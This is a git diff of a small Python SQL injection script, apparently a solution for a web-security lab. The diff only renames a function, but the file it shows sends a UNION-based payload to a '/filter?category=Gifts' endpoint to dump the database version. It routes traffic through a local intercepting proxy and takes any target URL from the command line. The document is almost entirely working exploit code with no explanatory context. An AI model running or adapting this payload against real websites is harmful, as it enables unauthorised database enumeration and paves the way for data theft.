@@ -12,7 +12,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def get_exploit_version(url):
+def get_version(url):
     path = "/filter?category=Gifts"
     sql_payload = "' UNION SELECT @@version, NULL%23"
     response = requests.get(
@@ -29,7 +29,7 @@ if __name__ == "__main__":
     try:
         url = sys.argv[1]
         print("[+] Dumping the version of the database...")
-        version = get_exploit_version(url)
+        version = get_version(url)
         print("[+] The database version is: " + version)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
